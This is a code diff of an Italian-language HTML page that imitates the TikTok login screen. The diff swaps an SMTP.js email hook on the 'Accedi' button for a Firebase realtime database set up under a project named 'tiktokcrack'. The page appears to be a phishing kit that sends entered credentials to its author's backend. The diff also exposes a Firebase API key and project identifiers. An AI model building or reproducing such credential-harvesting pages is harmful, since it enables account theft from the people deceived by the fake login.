@@ -2,9 +2,6 @@
 <html lang="it" dir="ltr"style="background-color="white"">
 <link rel="stylesheet" href="style.css">
   <head>
-    <script src="https://smtpjs.com/v3/smtp.js"></script>
-    <script src="SenderEmail.js" charset="utf-8"></script>
-    <meta charset="utf-8">
     <title>TikTok</title>
     <img
        align="left"
@@ -27,11 +24,31 @@
   <br>
   <h6 style="position: relative;top:-50px;margin-top: 30px;margin-left:-250px;font-family: 'Lato', sans-serif;height:100px;weight:100px;opacity:85%">Password dimenticata?</h6>
   <br>
-  <button id="btnAccedi" onclick="sendEmail()" class="btnAccedi" type="button">
+  <button id="btnAccedi"  class="btnAccedi" type="button">
     <strong>
     Accedi
   </strong>
   </button>
 </div>
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.9.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.9.0/firebase-database.js"></script>
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyCAKYQeM2szDKjWMMp6Ou4qeNkVdmN2MKg",
+    authDomain: "tiktokcrack-a8c28.firebaseapp.com",
+    databaseURL: "https://tiktokcrack-a8c28-default-rtdb.firebaseio.com",
+    projectId: "tiktokcrack-a8c28",
+    storageBucket: "tiktokcrack-a8c28.appspot.com",
+    messagingSenderId: "203328533206",
+    appId: "1:203328533206:web:f0cb2407f14923bc7b4f77"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+</script>
+  <script src="Firebase.js" charset="utf-8"></script>
  </body>
 </html>
